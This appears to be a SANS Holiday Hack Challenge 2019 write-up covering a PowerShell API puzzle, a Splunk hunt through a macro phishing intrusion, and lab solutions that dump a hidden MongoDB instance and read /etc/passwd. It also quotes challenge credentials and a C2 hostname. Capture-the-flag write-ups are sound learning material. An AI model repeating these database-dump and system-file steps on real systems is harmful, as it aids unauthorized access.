parameters directly to URI and type the command without -Body parameter. Our command will be: $r = 1 . 867 ; $t =- 33 . 5 ; $a = 65 . 5 ; $g = @{ O = 6 ; H = 7 ; He = 3 ; N = 4 ; Ne = 22 ; Ar = 11 ; Xe = 10 ; F = 20 ; Kr = 8 ; Rn = 9 } ; ( Invoke-WebRequest -Uri http : // localhost : 1225 / api / off /). Content ; ( Invoke-WebRequest -Uri http : // localhost : 1225 / api / on /). Content ; ( Invoke-WebRequest -Uri http : // localhost : 1225 / api / temperature ? val = $t ). Content ; ( Invoke-WebRequest -Uri http : // localhost : 1225 / api / angle ? val = $a ). Content ; ( Invoke-WebRequest -Uri http : // localhost : 1225 / api / gas -Method POST -Body $g ). Content ; ( Invoke-WebRequest -Uri http : // localhost : 1225 / api / refraction ? val = $r ). Content ; ( Invoke-WebRequest -Uri http : // localhost : 1225 / api / output ). Content ; Grouped all commands to quickly excute and also changed RawContent to Content to get only content as ouput. Christmas Cheer Laser Powered Off Christmas Cheer Laser Powered On Updated Laser Temperature - Check /api/output if 5 Mega-Jollies per liter reached. Updated Mirror Angle - Check /api/output if 5 Mega-Jollies per liter reached. Updated Gas Measurements - Check /api/output if 5 Mega-Jollies per liter reached. Updated Lense Refraction Level - Check /api/output if 5 Mega-Jollies per liter reached. Success! - 5.78 Mega-Jollies of Laser Output Reached! Success! - 5.78 Mega-Jollies of Laser Output Reached! You have completed the Xmas Cheer Laser challenge! \ud83c\udf89 Talk to SugarPlum Mary again: \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Sparkle Redberry You got it - three cheers for cheer! For objective 5, have you taken a look at our Zeek logs ? Something's gone wrong. But I hear someone named Rita can help us. Can you and she figure out what happened? Check your badge for the hints: RITA RITA's homepage","title":"11. Fixing the laser"},{"location":"helptheelves/challenge3/#what-youve-learned","text":"Different Powershell cmdlets: Get-Content , Get-History , Get-ChildItem , Sort-Object , Invoke-WebRequest Expand-Archive , Get-FileHash , Where-Object , Group-Object , Select-String , Get-Process , Stop-Process , Select-Xml , SelectNodes . Formatting the Powershell command output: Format-Table Searching for files using hashes , strings , LastWriteTime , Name Length . The environment variables. How to get Commands history. Gets the processes that are running on the local computer and how to stop any process. Dealing with xml files in Powershell. How to change binaries to executable and run them. Sending Http requests from Powershell. https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Core/?view=powershell-6 \u21a9 \u21a9 \u21a9 \u21a9 \u21a9 \u21a9 \u21a9 https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables?view=powershell-6 \u21a9 https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_provider?view=powershell-6 \u21a9 https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Archive/Expand-Archive?view=powershell-6 \u21a9 https://www.petri.com/powershell-problem-solver-finding-long-file-names \u21a9 https://www.youtube.com/watch?v=AcR9UvEnW98 https://www.w3schools.com/xml/xpath_intro.asp https://www.red-gate.com/simple-talk/sysadmin/powershell/powershell-data-basics-xml/ https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Utility/Select-Xml?view=powershell-6 https://docs.microsoft.com/en-us/dotnet/api/system.xml.xmlnode.selectnodes?view=netframework-4.8 https://www.youtube.com/watch?v=Ukuj_DxueIc https://docs.microsoft.com/en-us/dotnet/api/system.xml.xmlnode.lastchild?view=netframework-4.8 \u21a9 https://en.wikipedia.org/wiki/Executable_and_Linkable_Format \u21a9 https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-6 \u21a9","title":"\ud83c\udf93 What you've learned"},{"location":"helptheelves/challenge4/","text":"\ud83c\udfae Splunk Training questions \u00b6 \ud83d\udccd The Laboratory \ud83d\udc68\u200d\ud83d\udd2c Dr. Banas Hi, I'm Dr. Banas, professor of Cheerology at Elf University. This term, I'm teaching \"HOL 404: The Search for Holiday Cheer in Popular Culture,\" and I've had quite a shock! I was at home enjoying a nice cup of Gl\u00f8gg when I had a call from Kent, one of my students who interns at the Elf U SOC. Kent said that my computer has been hacking other computers on campus and that I needed to fix it ASAP! If I don't, he will have to report the incident to the boss of the SOC. Apparently, I can find out more information from this website https://splunk.elfu.org/ with the username: elf / Password: elfsocks. I don't know anything about computer security. Can you please help me? Watch > Talk by James Brodsky | Dashing Through the Logs Watch Dashing Through the Logs If you want your hunt to be successful, you need to look where the threats are. In modern environments, that means collecting endpoint and email logs and knowing what to search for in it. In this talk, we will cover critical Windows-based security event log sources like Sysmon, PowerShell, and process launch events. Additionally, we will introduce the stoQ automation framework for analyzing email. We\u2019ll show you how to use this data to pragmatically hunt for threats operating in your environment. Go to https://splunk.elfu.org/ and login with following: Username: elf Password: elfsocks The Search for Holiday Cheer Challenge Your goal is to answer the Challenge Question. You will include the answer to this question in your HHC write-up! You do not need to answer the training questions. You may simply search through the Elf U SOC data to find the answer to the final question on your own. If you need some guidance, answer the training questions! Each one will help you get closer to the answering the Challenge Question. Characters in the SOC Secure Chat are there to help you. If you see a blinking red dot next to a character, click on them and read the chat history to learn what they have to teach you! And don't forget to scroll up in the chat history! To search the SOC data, just click the Search link in the navigation bar in the upper left hand corner of the page. This challenge is best enjoyed on a laptop or desktop computer with screen width of 1600 pixels or more. WARNING This is a defensive challenge. Do not attack this system, web application, or back-end APIs. Welcome message \u26a1\ufe0f Solution \u00b6 Let's begin with the Training Questions: 1. What is the short host name of Professor Banas' computer? \u00b6 Let's check Kent chat first because he is the one informed Professor Banas about the hacking: Chat with Kent Read the chats very carefully. Go check out #ELFU SOC as he suggest: Chat with #ELFU SOC Easy to find in the #ELFU SOC chat: We have some system called sweetums here on campus communicating with the same weird IP, that's Professor Banas' system. Enter sweetums on the right input box next to the question to unlock the next question. Training Question 1: Correct sweetums 2. What is the name of the sensitive file that was likely accessed and copied by the attacker? \u00b6 Please provide the fully qualified location of the file. (Example: C:\\temp\\report.pdf ) Check Alice's chat: Chat with Alice Bluebird Chat with Alice Bluebird - After answer question #1 Searching by interesting word If you have a word that you are really interested in, just start searching for it. Here is an example of searching for the professor's username : Example Link index=main cbanas Use that technique (with a different search term) to answer question 2. Which word to search? Our very first worry was they may have found some of Santa 's sensitive data. Maybe start with his name Let's follow his instructions & hints: Click here or hit the Search link in the navigation up above to get started. Search using Santa : index=main santa Lets analysis the results: The attacker accessed cbanas account on sweetums 's computer. Using Get-ChildItem cmdlet in Powershell listed all files in C:\\Users\\cbanas . The resulted files : - Microsoft Edge.lnk - Naughty_and_Nice_2019_draft.txt - 19th Century Holiday Cheer Assignment.doc - assignment.zip - Bing.url - Desktop.lnk - Downloads.lnk - winrt--{S-1-5-21-1217370868-2414566453-2573080502-1004}-.searchconnector-ms Piped the result into ForEach-Object command to execute Select-String cmdlet for each object returned to search for word Santa . Select-String -path $_ -pattern Santa He found his target in this file: C:\\Users\\cbanas\\Documents\\Naughty_and_Nice_2019_draft.txt Then sends a file's contents to the Out-String cmdlet to displays it in the PowerShell console. Carl, you know there's no one I trust more than you to help. Can you have a look at this draft Naughty and Nice list for 2019 and let me know your thoughts? -Santa Also we see the download of the scanning tool, That's interesting: but let's stay on task here. Training Question 2: Correct C:\\Users\\cbanas\\Documents\\Naughty_and_Nice_2019_draft.txt 3. What is the fully-qualified domain name(FQDN) of the command and control(C2) server? \u00b6 (Example: badguy.baddies.com ) Check Alice's chat: Chat with Alice Bluebird - After answer question #2 Microsoft Sysmon data https://www.splunk.com/en_us/blog/security/a-salacious-soliloquy-on-sysmon.html Search Sysmon data in Splunk Start by specifying the sourcetype using a search like sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational In Sysmon, Event Code 3 represents network connections and you can narrow your search by adding the term powershell . index=main sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational powershell EventCode=3 There is an implied boolean AND operator between any search terms that you add. Try to narrow your search to include these terms. Look through the lists of Interesting Fields and Selected Fields in the left-hand column of the search window. Given the hints, our search will be: index=main sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational powershell EventCode=3 Then select Interesting Fields under Selected Fields in the left-hand column of the search window: Training Question 3: Correct 144.202.46.214.vultr.com 4. What document is involved with launching the malicious PowerShell code? \u00b6 Please provide just the filename. (Example: results.txt ) Check Alice's chat: Chat with Alice Bluebird - After answer question #3 View the PowerShell logs index=main sourcetype=\"WinEventLog:Microsoft-Windows-Powershell/Operational\" We need to determine the process ID or process GUID , We can pivot on time . Flip the results of that last search so the oldest event is at the top of the list by adding | reverse to the end . Pivot on time . Look at the Time column in your search results. If you click on the date/timestamp from that first event, you can specify a time window. Accept the default of \u00b1 five seconds and click apply. Then remove the sourcetype search term and also remove the | reverse and re-run the search. If Sysmon Event Code 1 results are not available, try looking for Windows Process Execution events (Event ID 4688 ). A search to get you started with 4688 logs is sourcetype=WinEventLog EventCode=4688 Keep in mind that 4688 events record process IDs in hexadecimal , so you may need to do some conversion. Let's start our search: Search for all the PowerShell logs and reverse the results order to get the oldest one: index=main sourcetype=\"WinEventLog:Microsoft-Windows-Powershell/Operational\" | reverse Pivot on time: Look at the Time column in the search results then click on the date/timestamp from that first event, Accept the default of +/- five seconds . Then remove the sourcetype search term and also remove the | reverse and re-run the search. Click on process_id on the left panel and you should be able to find two different process IDs from Sysmon events in that time window... Now we have two process id : 6268 , 5864 . We need to uncover what launched those processes. Check Sysmon Event Code 1 by clicking EventCode on the left panel and select Event Code 1 : The Sysmon Event Code 1 results are not leading to anything, Let's try looking for Windows Process Execution events (Event ID 4688 ) as suggested with the process ids we found. First set your time window back to all time: Go to search bar on the right > Select Date time range > Presets > All time : Then the 4688 events record process IDs in hexadecimal , so we need to do some conversion: 5864 to hex 0x16E8 6268 to hex 0x187C Let's do the search for each index=main sourcetype=WinEventLog EventCode=4688 process_id=0x16E8 This one doesn't lead for a \"document\" that appears to be involved with kicking off all this PowerShell. Let's try second process id: index=main sourcetype=WinEventLog EventCode=4688 process_id=0x187C Process Information: New Process ID: 0x187c New Process Name: C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\WINWORD.EXE Token Elevation Type: %%1938 Mandatory Label: Mandatory Label\\Medium Mandatory Level Creator Process ID: 0x1748 Creator Process Name: C:\\Windows\\explorer.exe Process Command Line: \"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Windows\\Temp\\Temp1_Buttercups_HOL404_assignment (002).zip\\19th Century Holiday Cheer Assignment.docm\" /o \"\" The file started all this is 19th Century Holiday Cheer Assignment.docm which opened in Microsoft Word application. Training Question 4: Correct 19th Century Holiday Cheer Assignment.docm 5. How many unique email addresses were used to send Holiday Cheer essays to Professor Banas? \u00b6 Please provide the numeric value. (Example: 1 ) Check Alice's chat: Chat with Alice Bluebird - After answer question #4 stoQ stoQ project home page stoQ talk slides from the SANS DFIR Summit. Example search index=main sourcetype=stoq | table _time results{}.workers.smtp.to results{}.workers.smtp.from results{}.workers.smtp.subject results{}.workers.smtp.body | sort - _time All assignment submissions must be made via email and must have the subject 'Holiday Cheer Assignment Submission' Email addresses are not case sensitive so don't double-count them!. After viewing the stoQ slides and documentation, We need to find all emails with subject Holiday Cheer Assignment Submission and sent to carl.banas@faculty.elfu.org we noted from example search result. So our search query will be: index=main sourcetype=stoq results{}.workers.smtp.subject=\"Holiday Cheer Assignment Submission\" AND results{}.workers.smtp.to = \"*carl.banas@faculty.elfu.org*\" | table _time results{}.workers.smtp.to results{}.workers.smtp.subject results{}.workers.smtp.from sourcetype=stoq to use stoQ tool as source. results{}.workers.smtp.subject to filter subjec to only \"Holiday Cheer Assignment Submission\". results{}.workers.smtp.to to filter sent only to this address \" carl.banas@faculty.elfu.org \" and adding * to include all results with different letter cases. table display results within table with fileds time , receiver , subject , sender Training Question 5: Correct We have 21 events! 6. What was the password for the zip archive that contained the suspicious file? \u00b6 Check Alice's chat: Chat with Alice Bluebird - After answer question #5 MITRE ATT&CK Technique 1193 https://attack.mitre.org/techniques/T1193/ Just use what you already know about the suspicious file name you identified, and about the type of visibility that stoQ gives you. Given the hints we will search for suspicious file name 19th Century Holiday Cheer Assignment.docm in the emails sent to Prof Carl: index=main sourcetype=stoq \"19th Century Holiday Cheer Assignment.docm\" results{}.workers.smtp.to = \"*carl.banas@faculty.elfu.org*\" | table _time results{}.workers.smtp.from results{}.workers.smtp.subject results{}.workers.smtp.body results{}.workers.smtp.body to return body of the email. Professor Banas, I have completed my assignment. Please open the attached zip file with password 123456789 and then open the word document to view it. You will have to click \"Enable Editing\" then \"Enable Content\" to see it. This was a fun assignment. I hope you like it! --Bradly Buttercups Training Question 5: Correct The password is 123456789 . 7. What email address did the suspicious file come from? \u00b6 Chat with Alice Bluebird - After answer question #6 We know the answer from pervious results because we used results{}.workers.smtp.from in our search query output. Simply use it as following: index=main sourcetype=stoq \"19th Century Holiday Cheer Assignment.docm\" | table _time results{}.workers.smtp.from Training Question 5: Correct The password is bradly.buttercups@eifu.org . \ud83c\udf93 What you've learned \u00b6 Using splunk search query by word , sourcetype , EventCode , process_id and how to look for Interesting Fields . Windows Process Execution events (Event ID 4688 for new process created) Sysmon Event id 1 for Process creation. Reverse the results order and Pivot on time. The 4688 events record process IDs in hexadecimal . Using stoQ tool to search emails.","title":"Splunk - The training questions"},{"location":"helptheelves/challenge4/#splunk-training-questions","text":"\ud83d\udccd The Laboratory \ud83d\udc68\u200d\ud83d\udd2c Dr. Banas Hi, I'm Dr. Banas, professor of Cheerology at Elf University. This term, I'm teaching \"HOL 404: The Search for Holiday Cheer in Popular Culture,\" and I've had quite a shock! I was at home enjoying a nice cup of Gl\u00f8gg when I had a call from Kent, one of my students who interns at the Elf U SOC. Kent said that my computer has been hacking other computers on campus and that I needed to fix it ASAP! If I don't, he will have to report the incident to the boss of the SOC. Apparently, I can find out more information from this website https://splunk.elfu.org/ with the username: elf / Password: elfsocks. I don't know anything about computer security. Can you please help me? Watch > Talk by James Brodsky | Dashing Through the Logs Watch Dashing Through the Logs If you want your hunt to be successful, you need to look where the threats are. In modern environments, that means collecting endpoint and email logs and knowing what to search for in it. In this talk, we will cover critical Windows-based security event log sources like Sysmon, PowerShell, and process launch events. Additionally, we will introduce the stoQ automation framework for analyzing email. We\u2019ll show you how to use this data to pragmatically hunt for threats operating in your environment. Go to https://splunk.elfu.org/ and login with following: Username: elf Password: elfsocks The Search for Holiday Cheer Challenge Your goal is to answer the Challenge Question. You will include the answer to this question in your HHC write-up! You do not need to answer the training questions. You may simply search through the Elf U SOC data to find the answer to the final question on your own. If you need some guidance, answer the training questions! Each one will help you get closer to the answering the Challenge Question. Characters in the SOC Secure Chat are there to help you. If you see a blinking red dot next to a character, click on them and read the chat history to learn what they have to teach you! And don't forget to scroll up in the chat history! To search the SOC data, just click the Search link in the navigation bar in the upper left hand corner of the page. This challenge is best enjoyed on a laptop or desktop computer with screen width of 1600 pixels or more. WARNING This is a defensive challenge. Do not attack this system, web application, or back-end APIs. Welcome message","title":"\ud83c\udfae Splunk Training questions"},{"location":"helptheelves/challenge4/#solution","text":"Let's begin with the Training Questions:","title":"\u26a1\ufe0f Solution"},{"location":"helptheelves/challenge4/#1-what-is-the-short-host-name-of-professor-banas-computer","text":"Let's check Kent chat first because he is the one informed Professor Banas about the hacking: Chat with Kent Read the chats very carefully. Go check out #ELFU SOC as he suggest: Chat with #ELFU SOC Easy to find in the #ELFU SOC chat: We have some system called sweetums here on campus communicating with the same weird IP, that's Professor Banas' system. Enter sweetums on the right input box next to the question to unlock the next question. Training Question 1: Correct sweetums","title":"1. What is the short host name of Professor Banas' computer?"},{"location":"helptheelves/challenge4/#2-what-is-the-name-of-the-sensitive-file-that-was-likely-accessed-and-copied-by-the-attacker","text":"Please provide the fully qualified location of the file. (Example: C:\\temp\\report.pdf ) Check Alice's chat: Chat with Alice Bluebird Chat with Alice Bluebird - After answer question #1 Searching by interesting word If you have a word that you are really interested in, just start searching for it. Here is an example of searching for the professor's username : Example Link index=main cbanas Use that technique (with a different search term) to answer question 2. Which word to search? Our very first worry was they may have found some of Santa 's sensitive data. Maybe start with his name Let's follow his instructions & hints: Click here or hit the Search link in the navigation up above to get started. Search using Santa : index=main santa Lets analysis the results: The attacker accessed cbanas account on sweetums 's computer. Using Get-ChildItem cmdlet in Powershell listed all files in C:\\Users\\cbanas . The resulted files : - Microsoft Edge.lnk - Naughty_and_Nice_2019_draft.txt - 19th Century Holiday Cheer Assignment.doc - assignment.zip - Bing.url - Desktop.lnk - Downloads.lnk - winrt--{S-1-5-21-1217370868-2414566453-2573080502-1004}-.searchconnector-ms Piped the result into ForEach-Object command to execute Select-String cmdlet for each object returned to search for word Santa . Select-String -path $_ -pattern Santa He found his target in this file: C:\\Users\\cbanas\\Documents\\Naughty_and_Nice_2019_draft.txt Then sends a file's contents to the Out-String cmdlet to displays it in the PowerShell console. Carl, you know there's no one I trust more than you to help. Can you have a look at this draft Naughty and Nice list for 2019 and let me know your thoughts? -Santa Also we see the download of the scanning tool, That's interesting: but let's stay on task here. Training Question 2: Correct C:\\Users\\cbanas\\Documents\\Naughty_and_Nice_2019_draft.txt","title":"2. What is the name of the sensitive file that was likely accessed and copied by the attacker?"},{"location":"helptheelves/challenge4/#3-what-is-the-fully-qualified-domain-namefqdn-of-the-command-and-controlc2-server","text":"(Example: badguy.baddies.com ) Check Alice's chat: Chat with Alice Bluebird - After answer question #2 Microsoft Sysmon data https://www.splunk.com/en_us/blog/security/a-salacious-soliloquy-on-sysmon.html Search Sysmon data in Splunk Start by specifying the sourcetype using a search like sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational In Sysmon, Event Code 3 represents network connections and you can narrow your search by adding the term powershell . index=main sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational powershell EventCode=3 There is an implied boolean AND operator between any search terms that you add. Try to narrow your search to include these terms. Look through the lists of Interesting Fields and Selected Fields in the left-hand column of the search window. Given the hints, our search will be: index=main sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational powershell EventCode=3 Then select Interesting Fields under Selected Fields in the left-hand column of the search window: Training Question 3: Correct 144.202.46.214.vultr.com","title":"3. What is the fully-qualified domain name(FQDN) of the command and control(C2) server?"},{"location":"helptheelves/challenge4/#4-what-document-is-involved-with-launching-the-malicious-powershell-code","text":"Please provide just the filename. (Example: results.txt ) Check Alice's chat: Chat with Alice Bluebird - After answer question #3 View the PowerShell logs index=main sourcetype=\"WinEventLog:Microsoft-Windows-Powershell/Operational\" We need to determine the process ID or process GUID , We can pivot on time . Flip the results of that last search so the oldest event is at the top of the list by adding | reverse to the end . Pivot on time . Look at the Time column in your search results. If you click on the date/timestamp from that first event, you can specify a time window. Accept the default of \u00b1 five seconds and click apply. Then remove the sourcetype search term and also remove the | reverse and re-run the search. If Sysmon Event Code 1 results are not available, try looking for Windows Process Execution events (Event ID 4688 ). A search to get you started with 4688 logs is sourcetype=WinEventLog EventCode=4688 Keep in mind that 4688 events record process IDs in hexadecimal , so you may need to do some conversion. Let's start our search: Search for all the PowerShell logs and reverse the results order to get the oldest one: index=main sourcetype=\"WinEventLog:Microsoft-Windows-Powershell/Operational\" | reverse Pivot on time: Look at the Time column in the search results then click on the date/timestamp from that first event, Accept the default of +/- five seconds . Then remove the sourcetype search term and also remove the | reverse and re-run the search. Click on process_id on the left panel and you should be able to find two different process IDs from Sysmon events in that time window... Now we have two process id : 6268 , 5864 . We need to uncover what launched those processes. Check Sysmon Event Code 1 by clicking EventCode on the left panel and select Event Code 1 : The Sysmon Event Code 1 results are not leading to anything, Let's try looking for Windows Process Execution events (Event ID 4688 ) as suggested with the process ids we found. First set your time window back to all time: Go to search bar on the right > Select Date time range > Presets > All time : Then the 4688 events record process IDs in hexadecimal , so we need to do some conversion: 5864 to hex 0x16E8 6268 to hex 0x187C Let's do the search for each index=main sourcetype=WinEventLog EventCode=4688 process_id=0x16E8 This one doesn't lead for a \"document\" that appears to be involved with kicking off all this PowerShell. Let's try second process id: index=main sourcetype=WinEventLog EventCode=4688 process_id=0x187C Process Information: New Process ID: 0x187c New Process Name: C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\WINWORD.EXE Token Elevation Type: %%1938 Mandatory Label: Mandatory Label\\Medium Mandatory Level Creator Process ID: 0x1748 Creator Process Name: C:\\Windows\\explorer.exe Process Command Line: \"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Windows\\Temp\\Temp1_Buttercups_HOL404_assignment (002).zip\\19th Century Holiday Cheer Assignment.docm\" /o \"\" The file started all this is 19th Century Holiday Cheer Assignment.docm which opened in Microsoft Word application. Training Question 4: Correct 19th Century Holiday Cheer Assignment.docm","title":"4. What document is involved with launching the malicious PowerShell code?"},{"location":"helptheelves/challenge4/#5-how-many-unique-email-addresses-were-used-to-send-holiday-cheer-essays-to-professor-banas","text":"Please provide the numeric value. (Example: 1 ) Check Alice's chat: Chat with Alice Bluebird - After answer question #4 stoQ stoQ project home page stoQ talk slides from the SANS DFIR Summit. Example search index=main sourcetype=stoq | table _time results{}.workers.smtp.to results{}.workers.smtp.from results{}.workers.smtp.subject results{}.workers.smtp.body | sort - _time All assignment submissions must be made via email and must have the subject 'Holiday Cheer Assignment Submission' Email addresses are not case sensitive so don't double-count them!. After viewing the stoQ slides and documentation, We need to find all emails with subject Holiday Cheer Assignment Submission and sent to carl.banas@faculty.elfu.org we noted from example search result. So our search query will be: index=main sourcetype=stoq results{}.workers.smtp.subject=\"Holiday Cheer Assignment Submission\" AND results{}.workers.smtp.to = \"*carl.banas@faculty.elfu.org*\" | table _time results{}.workers.smtp.to results{}.workers.smtp.subject results{}.workers.smtp.from sourcetype=stoq to use stoQ tool as source. results{}.workers.smtp.subject to filter subjec to only \"Holiday Cheer Assignment Submission\". results{}.workers.smtp.to to filter sent only to this address \" carl.banas@faculty.elfu.org \" and adding * to include all results with different letter cases. table display results within table with fileds time , receiver , subject , sender Training Question 5: Correct We have 21 events!","title":"5. How many unique email addresses were used to send Holiday Cheer essays to Professor Banas?"},{"location":"helptheelves/challenge4/#6-what-was-the-password-for-the-zip-archive-that-contained-the-suspicious-file","text":"Check Alice's chat: Chat with Alice Bluebird - After answer question #5 MITRE ATT&CK Technique 1193 https://attack.mitre.org/techniques/T1193/ Just use what you already know about the suspicious file name you identified, and about the type of visibility that stoQ gives you. Given the hints we will search for suspicious file name 19th Century Holiday Cheer Assignment.docm in the emails sent to Prof Carl: index=main sourcetype=stoq \"19th Century Holiday Cheer Assignment.docm\" results{}.workers.smtp.to = \"*carl.banas@faculty.elfu.org*\" | table _time results{}.workers.smtp.from results{}.workers.smtp.subject results{}.workers.smtp.body results{}.workers.smtp.body to return body of the email. Professor Banas, I have completed my assignment. Please open the attached zip file with password 123456789 and then open the word document to view it. You will have to click \"Enable Editing\" then \"Enable Content\" to see it. This was a fun assignment. I hope you like it! --Bradly Buttercups Training Question 5: Correct The password is 123456789 .","title":"6. What was the password for the zip archive that contained the suspicious file?"},{"location":"helptheelves/challenge4/#7-what-email-address-did-the-suspicious-file-come-from","text":"Chat with Alice Bluebird - After answer question #6 We know the answer from pervious results because we used results{}.workers.smtp.from in our search query output. Simply use it as following: index=main sourcetype=stoq \"19th Century Holiday Cheer Assignment.docm\" | table _time results{}.workers.smtp.from Training Question 5: Correct The password is bradly.buttercups@eifu.org .","title":"7.  What email address did the suspicious file come from?"},{"location":"helptheelves/challenge4/#what-youve-learned","text":"Using splunk search query by word , sourcetype , EventCode , process_id and how to look for Interesting Fields . Windows Process Execution events (Event ID 4688 for new process created) Sysmon Event id 1 for Process creation. Reverse the results order and Pivot on time. The 4688 events record process IDs in hexadecimal . Using stoQ tool to search emails.","title":"\ud83c\udf93 What you've learned"},{"location":"helptheelves/challenge5/","text":"\ud83c\udfae Mongo Pilfer \u00b6 \ud83d\udccd NetWars Room \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Holly Evergreen Hey! It's me, Holly Evergreen! My teacher has been locked out of the quiz database and can't remember the right solution. Without access to the answer, none of our quizzes will get graded. Can we help get back in to find that solution? I tried lsof -i , but that tool doesn't seem to be installed. I think there's a tool like ps that'll help too. What are the flags I need? Either way, you'll need to know a teensy bit of Mongo once you're in. Pretty please find us the solution to the quiz! MongoDB MongoDB Documentation . Find the solution hidden in the MongoDB on this system. \u26a1\ufe0f Solution \u00b6 When You open the Cranberry Pi terminal, You see: To connect to Mongo Shell we use mongo to connect to local host on default port 27017 1 mongo So we need to find the correct port number to connect. Using ps 2 to show the running processes : ps -axw -a lists processes started by all users. -x also lists processes started at boot like daemons. -w to wrap the output. The correct port is 12121 , let's connect to the Mongo Shell : mongo --port 12121 To see the databases: show dbs We have 5 databases admin 0.000GB config 0.000GB elfu 0.000GB local 0.000GB test 0.000GB Let's select elfu database to use use elfu Then show it's collections show collections Elfu db collections: ait chum line metadata solution system.js tackle tincan Check the solution collection db.solution.find() { \"_id\" : \"You did good! Just run the command between the stars: ** db.loadServerScripts();displaySolution(); **\" } Run the command to get the flag! db.loadServerScripts();displaySolution(); Alternative Solution | mongodump By using mongodump command to dump all databases: mongodump --port 12121 then search the dump by grep grep -Ril \"solution\" i stands for ignore case (optional in your case). R stands for recursive. l stands for \"show the file name, not the result itself\". . stands for current folder. dump/elfu/solution.metadata.json dump/elfu/solution.bson then read the bson file content cat dump/elfu/solution.bson t_id fYou did good! Just run the command between the stars: ** db.loadServerScripts();displaySolution(); ** then connect to mongo shell and run the command on the elfu db mongo --port 12121; use elfu; db.loadServerScripts();displaySolution(); You have completed the Mongo Pilfer challenge! \ud83c\udf89 \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Holly Evergreen Woohoo! Fantabulous! I'll be the coolest elf in class. On a completely unrelated note, digital rights management can bring a hacking elf down. That ElfScrow one can really be a hassle. It's a good thing Ron Bowes is giving a talk on reverse engineering! That guy knows how to rip a thing apart. It's like he breathes opcodes! \ud83c\udf93 What you've learned \u00b6 How to connect to mongo shell and find correct port. Finding databases. collections. dumping databases. https://opentechguides.com/how-to/article/mongodb/118/mongodb-cheatsheat.html \u21a9 https://linuxhint.com/ps_command_linux-2/ \u21a9","title":"Mongo Pilfer"},{"location":"helptheelves/challenge5/#mongo-pilfer","text":"\ud83d\udccd NetWars Room \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Holly Evergreen Hey! It's me, Holly Evergreen! My teacher has been locked out of the quiz database and can't remember the right solution. Without access to the answer, none of our quizzes will get graded. Can we help get back in to find that solution? I tried lsof -i , but that tool doesn't seem to be installed. I think there's a tool like ps that'll help too. What are the flags I need? Either way, you'll need to know a teensy bit of Mongo once you're in. Pretty please find us the solution to the quiz! MongoDB MongoDB Documentation . Find the solution hidden in the MongoDB on this system.","title":"\ud83c\udfae Mongo Pilfer"},{"location":"helptheelves/challenge5/#solution","text":"When You open the Cranberry Pi terminal, You see: To connect to Mongo Shell we use mongo to connect to local host on default port 27017 1 mongo So we need to find the correct port number to connect. Using ps 2 to show the running processes : ps -axw -a lists processes started by all users. -x also lists processes started at boot like daemons. -w to wrap the output. The correct port is 12121 , let's connect to the Mongo Shell : mongo --port 12121 To see the databases: show dbs We have 5 databases admin 0.000GB config 0.000GB elfu 0.000GB local 0.000GB test 0.000GB Let's select elfu database to use use elfu Then show it's collections show collections Elfu db collections: ait chum line metadata solution system.js tackle tincan Check the solution collection db.solution.find() { \"_id\" : \"You did good! Just run the command between the stars: ** db.loadServerScripts();displaySolution(); **\" } Run the command to get the flag! db.loadServerScripts();displaySolution(); Alternative Solution | mongodump By using mongodump command to dump all databases: mongodump --port 12121 then search the dump by grep grep -Ril \"solution\" i stands for ignore case (optional in your case). R stands for recursive. l stands for \"show the file name, not the result itself\". . stands for current folder. dump/elfu/solution.metadata.json dump/elfu/solution.bson then read the bson file content cat dump/elfu/solution.bson t_id fYou did good! Just run the command between the stars: ** db.loadServerScripts();displaySolution(); ** then connect to mongo shell and run the command on the elfu db mongo --port 12121; use elfu; db.loadServerScripts();displaySolution(); You have completed the Mongo Pilfer challenge! \ud83c\udf89 \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Holly Evergreen Woohoo! Fantabulous! I'll be the coolest elf in class. On a completely unrelated note, digital rights management can bring a hacking elf down. That ElfScrow one can really be a hassle. It's a good thing Ron Bowes is giving a talk on reverse engineering! That guy knows how to rip a thing apart. It's like he breathes opcodes!","title":"\u26a1\ufe0f Solution"},{"location":"helptheelves/challenge5/#what-youve-learned","text":"How to connect to mongo shell and find correct port. Finding databases. collections. dumping databases. https://opentechguides.com/how-to/article/mongodb/118/mongodb-cheatsheat.html \u21a9 https://linuxhint.com/ps_command_linux-2/ \u21a9","title":"\ud83c\udf93 What you've learned"},{"location":"helptheelves/challenge6/","text":"\ud83c\udfae Nyanshell \u00b6 \ud83d\udccd The Speaker UNpreparedness Room \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Alabaster Snowball Welcome to the Speaker UNpreparedness Room! My name's Alabaster Snowball and I could use a hand. I'm trying to log into this terminal, but something's gone horribly wrong. Every time I try to log in, I get accosted with ... a hatted cat and a toaster pastry? I thought my shell was Bash, not flying feline. When I try to overwrite it with something else, I get permission errors. Have you heard any chatter about immutable files ? And what is sudo -l telling me? Chatter? sudo -l says I can run a command as root. What does it do? User's Shells On Linux, a user's shell is determined by the contents of /etc/passwd . Log in as the user alabaster_snowball with a password of Password2 , and land in a Bash prompt \u26a1\ufe0f Solution \u00b6 When You open the Cranberry Pi terminal, You see: if you try to login using the credentials provided: su alabaster_snowball You will get nyancat! Let's check user's shell by reading the /etc/passwd file: cat /etc/passwd root:x:0:0:root:/root:/bin/bash 